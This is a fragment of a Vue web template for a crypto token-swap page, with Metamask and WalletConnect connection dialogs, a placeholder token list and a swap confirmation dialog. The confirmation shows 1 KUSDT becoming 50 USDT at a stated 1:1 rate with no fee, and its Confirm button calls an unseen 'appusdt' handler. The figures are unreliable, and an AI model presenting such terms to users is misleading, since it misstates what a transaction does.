                alt="data:image/svg+xml,<svg width=&quot;28&quot; height=&quot;28&quot; viewBox=&quot;0 0 28 28&quot; fill=&quot;none&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;>%0A<rect width=&quot;28&quot; height=&quot;28&quot; fill=&quot;white&quot;/>%0A<path d=&quot;M24.0891 3.1199L15.3446 9.61456L16.9617 5.7828L24.0891 3.1199Z&quot; fill=&quot;%23E2761B&quot; stroke=&quot;%23E2761B&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M3.90207 3.1199L12.5763 9.67608L11.0383 5.7828L3.90207 3.1199Z&quot; fill=&quot;%23E4761B&quot; stroke=&quot;%23E4761B&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M20.9429 18.1745L18.6139 21.7426L23.597 23.1136L25.0295 18.2536L20.9429 18.1745Z&quot; fill=&quot;%23E4761B&quot; stroke=&quot;%23E4761B&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M2.97929 18.2536L4.40301 23.1136L9.38607 21.7426L7.05713 18.1745L2.97929 18.2536Z&quot; fill=&quot;%23E4761B&quot; stroke=&quot;%23E4761B&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M9.10483 12.1456L7.71626 14.2461L12.6642 14.4658L12.4884 9.14877L9.10483 12.1456Z&quot; fill=&quot;%23E4761B&quot; stroke=&quot;%23E4761B&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M18.8864 12.1456L15.4589 9.08725L15.3446 14.4658L20.2837 14.2461L18.8864 12.1456Z&quot; fill=&quot;%23E4761B&quot; stroke=&quot;%23E4761B&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M9.38606 21.7426L12.3566 20.2925L9.79033 18.2888L9.38606 21.7426Z&quot; fill=&quot;%23E4761B&quot; stroke=&quot;%23E4761B&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M15.6347 20.2925L18.6139 21.7426L18.2009 18.2888L15.6347 20.2925Z&quot; fill=&quot;%23E4761B&quot; stroke=&quot;%23E4761B&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M18.6139 21.7426L15.6347 20.2925L15.8719 22.2348L15.8456 23.0521L18.6139 21.7426Z&quot; fill=&quot;%23D7C1B3&quot; stroke=&quot;%23D7C1B3&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M9.38606 21.7426L12.1544 23.0521L12.1368 22.2348L12.3566 20.2925L9.38606 21.7426Z&quot; fill=&quot;%23D7C1B3&quot; stroke=&quot;%23D7C1B3&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M12.1984 17.0056L9.72002 16.2762L11.4689 15.4765L12.1984 17.0056Z&quot; fill=&quot;%23233447&quot; stroke=&quot;%23233447&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M15.7928 17.0056L16.5223 15.4765L18.28 16.2762L15.7928 17.0056Z&quot; fill=&quot;%23233447&quot; stroke=&quot;%23233447&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M9.38606 21.7426L9.80791 18.1745L7.05712 18.2536L9.38606 21.7426Z&quot; fill=&quot;%23CD6116&quot; stroke=&quot;%23CD6116&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M18.1921 18.1745L18.6139 21.7426L20.9429 18.2536L18.1921 18.1745Z&quot; fill=&quot;%23CD6116&quot; stroke=&quot;%23CD6116&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M20.2837 14.2461L15.3446 14.4658L15.8016 17.0057L16.5311 15.4765L18.2888 16.2762L20.2837 14.2461Z&quot; fill=&quot;%23CD6116&quot; stroke=&quot;%23CD6116&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M9.72002 16.2762L11.4777 15.4765L12.1984 17.0057L12.6642 14.4658L7.71626 14.2461L9.72002 16.2762Z&quot; fill=&quot;%23CD6116&quot; stroke=&quot;%23CD6116&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M7.71626 14.2461L9.79033 18.2888L9.72002 16.2762L7.71626 14.2461Z&quot; fill=&quot;%23E4751F&quot; stroke=&quot;%23E4751F&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M18.2888 16.2762L18.2009 18.2888L20.2837 14.2461L18.2888 16.2762Z&quot; fill=&quot;%23E4751F&quot; stroke=&quot;%23E4751F&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M12.6642 14.4658L12.1984 17.0057L12.7784 20.0025L12.9102 16.0565L12.6642 14.4658Z&quot; fill=&quot;%23E4751F&quot; stroke=&quot;%23E4751F&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M15.3446 14.4658L15.1073 16.0477L15.2128 20.0025L15.8016 17.0057L15.3446 14.4658Z&quot; fill=&quot;%23E4751F&quot; stroke=&quot;%23E4751F&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M15.8016 17.0056L15.2128 20.0025L15.6347 20.2925L18.2009 18.2888L18.2888 16.2762L15.8016 17.0056Z&quot; fill=&quot;%23F6851B&quot; stroke=&quot;%23F6851B&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M9.72002 16.2762L9.79033 18.2888L12.3566 20.2925L12.7784 20.0025L12.1984 17.0056L9.72002 16.2762Z&quot; fill=&quot;%23F6851B&quot; stroke=&quot;%23F6851B&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M15.8456 23.0521L15.8719 22.2348L15.6522 22.0414H12.339L12.1368 22.2348L12.1544 23.0521L9.38606 21.7426L10.3528 22.5336L12.3126 23.8958H15.6786L17.6472 22.5336L18.6139 21.7426L15.8456 23.0521Z&quot; fill=&quot;%23C0AD9E&quot; stroke=&quot;%23C0AD9E&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M15.6347 20.2925L15.2128 20.0025H12.7784L12.3566 20.2925L12.1368 22.2348L12.339 22.0414H15.6522L15.8719 22.2348L15.6347 20.2925Z&quot; fill=&quot;%23161616&quot; stroke=&quot;%23161616&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M24.4583 10.0364L25.2053 6.45072L24.0891 3.1199L15.6347 9.39485L18.8864 12.1456L23.4827 13.4903L24.5022 12.3038L24.0628 11.9874L24.7658 11.3459L24.221 10.924L24.924 10.3879L24.4583 10.0364Z&quot; fill=&quot;%23763D16&quot; stroke=&quot;%23763D16&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M2.79472 6.45072L3.54174 10.0364L3.06717 10.3879L3.77024 10.924L3.23415 11.3459L3.93722 11.9874L3.4978 12.3038L4.50847 13.4903L9.10483 12.1456L12.3566 9.39485L3.90207 3.1199L2.79472 6.45072Z&quot; fill=&quot;%23763D16&quot; stroke=&quot;%23763D16&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M23.4827 13.4903L18.8864 12.1456L20.2837 14.2461L18.2009 18.2888L20.9429 18.2536H25.0295L23.4827 13.4903Z&quot; fill=&quot;%23F6851B&quot; stroke=&quot;%23F6851B&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M9.10484 12.1456L4.50848 13.4903L2.97929 18.2536H7.05713L9.79033 18.2888L7.71626 14.2461L9.10484 12.1456Z&quot; fill=&quot;%23F6851B&quot; stroke=&quot;%23F6851B&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M15.3446 14.4658L15.6347 9.39485L16.9705 5.7828H11.0383L12.3566 9.39485L12.6642 14.4658L12.7696 16.0653L12.7784 20.0025H15.2128L15.2304 16.0653L15.3446 14.4658Z&quot; fill=&quot;%23F6851B&quot; stroke=&quot;%23F6851B&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A</svg>%0A"
                src="data:image/svg+xml,<svg width=&quot;28&quot; height=&quot;28&quot; viewBox=&quot;0 0 28 28&quot; fill=&quot;none&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;>%0A<rect width=&quot;28&quot; height=&quot;28&quot; fill=&quot;white&quot;/>%0A<path d=&quot;M24.0891 3.1199L15.3446 9.61456L16.9617 5.7828L24.0891 3.1199Z&quot; fill=&quot;%23E2761B&quot; stroke=&quot;%23E2761B&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M3.90207 3.1199L12.5763 9.67608L11.0383 5.7828L3.90207 3.1199Z&quot; fill=&quot;%23E4761B&quot; stroke=&quot;%23E4761B&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M20.9429 18.1745L18.6139 21.7426L23.597 23.1136L25.0295 18.2536L20.9429 18.1745Z&quot; fill=&quot;%23E4761B&quot; stroke=&quot;%23E4761B&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M2.97929 18.2536L4.40301 23.1136L9.38607 21.7426L7.05713 18.1745L2.97929 18.2536Z&quot; fill=&quot;%23E4761B&quot; stroke=&quot;%23E4761B&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M9.10483 12.1456L7.71626 14.2461L12.6642 14.4658L12.4884 9.14877L9.10483 12.1456Z&quot; fill=&quot;%23E4761B&quot; stroke=&quot;%23E4761B&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M18.8864 12.1456L15.4589 9.08725L15.3446 14.4658L20.2837 14.2461L18.8864 12.1456Z&quot; fill=&quot;%23E4761B&quot; stroke=&quot;%23E4761B&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M9.38606 21.7426L12.3566 20.2925L9.79033 18.2888L9.38606 21.7426Z&quot; fill=&quot;%23E4761B&quot; stroke=&quot;%23E4761B&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M15.6347 20.2925L18.6139 21.7426L18.2009 18.2888L15.6347 20.2925Z&quot; fill=&quot;%23E4761B&quot; stroke=&quot;%23E4761B&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M18.6139 21.7426L15.6347 20.2925L15.8719 22.2348L15.8456 23.0521L18.6139 21.7426Z&quot; fill=&quot;%23D7C1B3&quot; stroke=&quot;%23D7C1B3&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M9.38606 21.7426L12.1544 23.0521L12.1368 22.2348L12.3566 20.2925L9.38606 21.7426Z&quot; fill=&quot;%23D7C1B3&quot; stroke=&quot;%23D7C1B3&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M12.1984 17.0056L9.72002 16.2762L11.4689 15.4765L12.1984 17.0056Z&quot; fill=&quot;%23233447&quot; stroke=&quot;%23233447&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M15.7928 17.0056L16.5223 15.4765L18.28 16.2762L15.7928 17.0056Z&quot; fill=&quot;%23233447&quot; stroke=&quot;%23233447&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M9.38606 21.7426L9.80791 18.1745L7.05712 18.2536L9.38606 21.7426Z&quot; fill=&quot;%23CD6116&quot; stroke=&quot;%23CD6116&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M18.1921 18.1745L18.6139 21.7426L20.9429 18.2536L18.1921 18.1745Z&quot; fill=&quot;%23CD6116&quot; stroke=&quot;%23CD6116&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M20.2837 14.2461L15.3446 14.4658L15.8016 17.0057L16.5311 15.4765L18.2888 16.2762L20.2837 14.2461Z&quot; fill=&quot;%23CD6116&quot; stroke=&quot;%23CD6116&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M9.72002 16.2762L11.4777 15.4765L12.1984 17.0057L12.6642 14.4658L7.71626 14.2461L9.72002 16.2762Z&quot; fill=&quot;%23CD6116&quot; stroke=&quot;%23CD6116&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M7.71626 14.2461L9.79033 18.2888L9.72002 16.2762L7.71626 14.2461Z&quot; fill=&quot;%23E4751F&quot; stroke=&quot;%23E4751F&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M18.2888 16.2762L18.2009 18.2888L20.2837 14.2461L18.2888 16.2762Z&quot; fill=&quot;%23E4751F&quot; stroke=&quot;%23E4751F&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M12.6642 14.4658L12.1984 17.0057L12.7784 20.0025L12.9102 16.0565L12.6642 14.4658Z&quot; fill=&quot;%23E4751F&quot; stroke=&quot;%23E4751F&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M15.3446 14.4658L15.1073 16.0477L15.2128 20.0025L15.8016 17.0057L15.3446 14.4658Z&quot; fill=&quot;%23E4751F&quot; stroke=&quot;%23E4751F&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M15.8016 17.0056L15.2128 20.0025L15.6347 20.2925L18.2009 18.2888L18.2888 16.2762L15.8016 17.0056Z&quot; fill=&quot;%23F6851B&quot; stroke=&quot;%23F6851B&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M9.72002 16.2762L9.79033 18.2888L12.3566 20.2925L12.7784 20.0025L12.1984 17.0056L9.72002 16.2762Z&quot; fill=&quot;%23F6851B&quot; stroke=&quot;%23F6851B&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M15.8456 23.0521L15.8719 22.2348L15.6522 22.0414H12.339L12.1368 22.2348L12.1544 23.0521L9.38606 21.7426L10.3528 22.5336L12.3126 23.8958H15.6786L17.6472 22.5336L18.6139 21.7426L15.8456 23.0521Z&quot; fill=&quot;%23C0AD9E&quot; stroke=&quot;%23C0AD9E&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M15.6347 20.2925L15.2128 20.0025H12.7784L12.3566 20.2925L12.1368 22.2348L12.339 22.0414H15.6522L15.8719 22.2348L15.6347 20.2925Z&quot; fill=&quot;%23161616&quot; stroke=&quot;%23161616&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M24.4583 10.0364L25.2053 6.45072L24.0891 3.1199L15.6347 9.39485L18.8864 12.1456L23.4827 13.4903L24.5022 12.3038L24.0628 11.9874L24.7658 11.3459L24.221 10.924L24.924 10.3879L24.4583 10.0364Z&quot; fill=&quot;%23763D16&quot; stroke=&quot;%23763D16&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M2.79472 6.45072L3.54174 10.0364L3.06717 10.3879L3.77024 10.924L3.23415 11.3459L3.93722 11.9874L3.4978 12.3038L4.50847 13.4903L9.10483 12.1456L12.3566 9.39485L3.90207 3.1199L2.79472 6.45072Z&quot; fill=&quot;%23763D16&quot; stroke=&quot;%23763D16&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M23.4827 13.4903L18.8864 12.1456L20.2837 14.2461L18.2009 18.2888L20.9429 18.2536H25.0295L23.4827 13.4903Z&quot; fill=&quot;%23F6851B&quot; stroke=&quot;%23F6851B&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M9.10484 12.1456L4.50848 13.4903L2.97929 18.2536H7.05713L9.79033 18.2888L7.71626 14.2461L9.10484 12.1456Z&quot; fill=&quot;%23F6851B&quot; stroke=&quot;%23F6851B&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M15.3446 14.4658L15.6347 9.39485L16.9705 5.7828H11.0383L12.3566 9.39485L12.6642 14.4658L12.7696 16.0653L12.7784 20.0025H15.2128L15.2304 16.0653L15.3446 14.4658Z&quot; fill=&quot;%23F6851B&quot; stroke=&quot;%23F6851B&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A</svg>%0A"
                style="border-radius: 50%;">
              &nbsp; Metamask
            </div>
            <div class="btn" @click="connect({ connector: walletConnect({projectId}),chainId })">
              <img width="20" height="20" class="iekbcc0 ju367v2m ju367v8p ju367v9f" aria-hidden="true" src="data:image/svg+xml,<svg width=&quot;28&quot; height=&quot;28&quot; viewBox=&quot;0 0 28 28&quot; fill=&quot;none&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;>%0A<rect width=&quot;28&quot; height=&quot;28&quot; fill=&quot;%233B99FC&quot;/>%0A<path d=&quot;M8.38969 10.3739C11.4882 7.27538 16.5118 7.27538 19.6103 10.3739L19.9832 10.7468C20.1382 10.9017 20.1382 11.1529 19.9832 11.3078L18.7076 12.5835C18.6301 12.6609 18.5045 12.6609 18.4271 12.5835L17.9139 12.0703C15.7523 9.9087 12.2477 9.9087 10.0861 12.0703L9.53655 12.6198C9.45909 12.6973 9.3335 12.6973 9.25604 12.6198L7.98039 11.3442C7.82547 11.1893 7.82547 10.9381 7.98039 10.7832L8.38969 10.3739ZM22.2485 13.012L23.3838 14.1474C23.5387 14.3023 23.5387 14.5535 23.3838 14.7084L18.2645 19.8277C18.1096 19.9827 17.8584 19.9827 17.7035 19.8277C17.7035 19.8277 17.7035 19.8277 17.7035 19.8277L14.0702 16.1944C14.0314 16.1557 13.9686 16.1557 13.9299 16.1944C13.9299 16.1944 13.9299 16.1944 13.9299 16.1944L10.2966 19.8277C10.1417 19.9827 9.89053 19.9827 9.73561 19.8278C9.7356 19.8278 9.7356 19.8277 9.7356 19.8277L4.61619 14.7083C4.46127 14.5534 4.46127 14.3022 4.61619 14.1473L5.75152 13.012C5.90645 12.857 6.15763 12.857 6.31255 13.012L9.94595 16.6454C9.98468 16.6841 10.0475 16.6841 10.0862 16.6454C10.0862 16.6454 10.0862 16.6454 10.0862 16.6454L13.7194 13.012C13.8743 12.857 14.1255 12.857 14.2805 13.012C14.2805 13.012 14.2805 13.012 14.2805 13.012L17.9139 16.6454C17.9526 16.6841 18.0154 16.6841 18.0541 16.6454L21.6874 13.012C21.8424 12.8571 22.0936 12.8571 22.2485 13.012Z&quot; fill=&quot;white&quot;/>%0A</svg>%0A" style="transition: opacity 0.15s linear; user-select: none;border-radius: 50%;">
              &nbsp; Walletconnect
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>

  <!-- selectTokenLayer -->
  <div class="g_backdrop selectTokenLayer" v-show="data.dialogs['selectTokenLayer'].show">
    <div class="bg" :class="{ 'show': data.dialogs['selectTokenLayer'].contentShow }">
      <div class="g_dialog">
        <div class="top">
          <div class="title">Select Token</div>
          <div style="cursor: pointer;" @click="hideDialog('selectTokenLayer')">
            <svg xmlns="http://www.w3.org/2000/svg" fill="rgb(150, 150, 150)" viewBox="0 0 32 32"
                 style="width: 20px; height: 20px;">
              <path fill-rule="evenodd"
                    d="M5.94 5.94a1.5 1.5 0 0 1 2.12 0L16 13.878l7.94-7.94a1.5 1.5 0 0 1 2.12 2.122L18.122 16l7.94 7.94a1.5 1.5 0 0 1-2.122 2.12L16 18.122l-7.94 7.94a1.5 1.5 0 0 1-2.12-2.122L13.878 16l-7.94-7.94a1.5 1.5 0 0 1 0-2.12"
                    clip-rule="evenodd"></path>
            </svg>
          </div>
        </div>
        <div class="token_search"><input type="text" placeholder="Search token"/></div>
        <div class="token_list">
          <div v-for="i in 20">
            <div class="token_item">
              <div class="token_icon">
                <img
                    src="data:image/svg+xml,%3csvg%20width='256'%20height='256'%20viewBox='0%200%20256%20256'%20fill='none'%20xmlns='http://www.w3.org/2000/svg'%3e%3cpath%20d='M0%20128C0%2057.3076%2057.3076%200%20128%200C198.692%200%20256%2057.3076%20256%20128C256%20198.692%20198.692%20256%20128%20256C57.3076%20256%200%20198.692%200%20128Z'%20fill='%23040404'/%3e%3cg%20clip-path='url(%23clip0_544_687)'%3e%3cpath%20d='M124.421%2089.9797C124.421%2084.302%20129.053%2079.6765%20134.74%2079.6765H153.204V54.6091H143.972H134.74C115.178%2054.6091%2099.3152%2070.4475%2099.3152%2089.9797C99.3152%2095.0766%20100.402%2099.9214%20102.345%20104.294C87.1521%20110.707%2077.0638%20124.331%2074.7146%20141.572C71.9702%20160.502%2079.5666%20180.922%2096.1097%20190.787C110.874%20200.07%20133.96%20199.457%20146.431%20186.577V195.127H172.129V100.283H134.75C129.064%20100.283%20124.421%2095.6576%20124.421%2089.9797ZM147.002%20125.361V149.168C147.002%20162.321%20136.32%20172.975%20123.158%20172.975C109.996%20172.975%2099.3152%20162.31%2099.3152%20149.168C99.3152%20136.026%20109.996%20125.361%20123.158%20125.361H147.002Z'%20fill='%23BFF009'/%3e%3c/g%3e%3cdefs%3e%3cclipPath%20id='clip0_544_687'%3e%3crect%20width='98.304'%20height='142.848'%20fill='white'%20transform='translate(73.9844%2054.272)'/%3e%3c/clipPath%3e%3c/defs%3e%3c/svg%3e"
                    width="32" height="32" v-if="i % 2 == 0">
                <img src="https://api.swapscanner.io/api/tokens/0x533c42dc2f9339320dae82a44facf00efc60a68c/icon"
                     alt="Token" width="32" height="32" v-else-if="i % 3 == 0">
                <img src="https://api.swapscanner.io/api/tokens/0x588c62ed9aa7367d7cd9c2a9aaac77e44fe8221b/icon"
                     alt="Token" width="32" height="32" v-else>
              </div>
              <div class="token_name">
                <div style="display: flex;justify-content: space-between;">
                  <div style="color:#fff;">KAIA</div>
                  <div style="color:rgba(255, 255, 255, 0.7);">
                    <span>0.000000</span>&nbsp;
                    <span style="color:rgba(255, 255, 255, 0.4);">KAIA</span>
                  </div>
                </div>
                <div style="display: flex;justify-content: space-between;font-size:12px;">
                  <div>KAIA</div>
                  <div>($0.00)</div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>

  <!-- pleaseConfirm -->
  <div class="g_backdrop pleaseConfirm" v-show="data.dialogs['pleaseConfirm'].show">
    <div class="bg" :class="{ 'show': data.dialogs['pleaseConfirm'].contentShow }">
      <div class="g_dialog">

        <div class="top">
          <div class="title">Please Confirm</div>
          <div style="cursor: pointer;" @click="hideDialog('pleaseConfirm')">
            <svg xmlns="http://www.w3.org/2000/svg" fill="rgb(150, 150, 150)" viewBox="0 0 32 32"
                 style="width: 20px; height: 20px;">
              <path fill-rule="evenodd"
                    d="M5.94 5.94a1.5 1.5 0 0 1 2.12 0L16 13.878l7.94-7.94a1.5 1.5 0 0 1 2.12 2.122L18.122 16l7.94 7.94a1.5 1.5 0 0 1-2.122 2.12L16 18.122l-7.94 7.94a1.5 1.5 0 0 1-2.12-2.122L13.878 16l-7.94-7.94a1.5 1.5 0 0 1 0-2.12"
                    clip-rule="evenodd"></path>
            </svg>
          </div>
        </div>

        <div class="confirm_box">

          <div class="c_from" style="margin-top: 20px;">From</div>
          <div class="coin_prs">
            <div><img src="/public/images/2M.gif" height="25"/></div>
            <div class="c_prs">1</div>
            <div class="c_name">KUSDT</div>
          </div>

          <div style="text-align: center; margin: 30px 0px 10px;"><img src="/public/images/bottom.png" alt=""></div>

          <div class="c_from">To</div>
          <div class="coin_prs">
            <div><img src="/public/images/td_icon.png" height="25"/></div>
            <div class="c_prs">50</div>
            <div class="c_name">USDT</div>
          </div>


          <div class="coin_prs" style="margin: 50px 0px 20px 0px;">
            <div class="sw_title">Swap rate</div>
            <div class="sw_data">
              <div><strong>1</strong>KUSDT</div>
              <div><strong>=1</strong>USDT</div>
            </div>
          </div>

          <div class="coin_prs" style="margin: 20px 0px ;">
            <div class="sw_title">Est.gas fee</div>
            <div class="sw_data">
              <div><strong>0.00478</strong>KAIA</div>
              <div>($0.01)</div>
            </div>
          </div>


          <div class="coin_prs" style="margin: 20px 0px ;">
            <div class="sw_title">Service charge</div>
            <div class="sw_data">
              <div><span>🎉 Free!</span></div>
            </div>
          </div>

          <div style="padding-bottom:20px;">
            <label class="ccheckbox">
              <input type="checkbox" v-model="data.chked"/>
              <span class="checkmark"></span>
              <span>I have checked all the information</span>
            </label>
            <!-- <input type="checkbox" v-model="data.chked" checked class="custom-checkbox"> I have checked all the information -->
          </div>

          <div class="sw_btnbox">
            <div class="btn_1" @click="hideDialog('pleaseConfirm')">
              <div>Cancel</div>
            </div>
            <div class="btn_2">
              <div class="fmRedHatDisplay2-7" :class="{'on':data.chked}" @click="appusdt">Confirm</div>
            </div>
          </div>

        </div>

      </div>
    </div>
  </div>

  <!-- pages -->
  <swiper @swiper="onSwiper" :direction="'vertical'" :slidesPerView="1" :spaceBetween="0" :mousewheel="true"
          :pagination="{ clickable: true }" :modules="[Mousewheel, Pagination]">
    <swiper-slide>
      <div class="page p1">
        <header>
          <div style="flex: 1; padding-top: 11px;">
            <img src="/public/images/logo1.svg" alt="logo"
                 style="width: 148px;height: 24px; justify-content:flex-start;">
                        <button @click="showDialog('walletConnection')">链接钱包</button>
                        <button @click="showDialog('mobileApp')">手机连接钱包</button>
                        <button @click="showDialog('selectTokenLayer')">选择token</button>
                        <button @click="showDialog('pleaseConfirm')">结算确认</button>
                        <button @click="showDialog('swapProgress')">正在swap</button>
                        <button @click="showDialog('swapCompleted')">swap完成</button>
          </div>
          <button class="hd_button">
            <img width="32" height="32" class="pc_open"
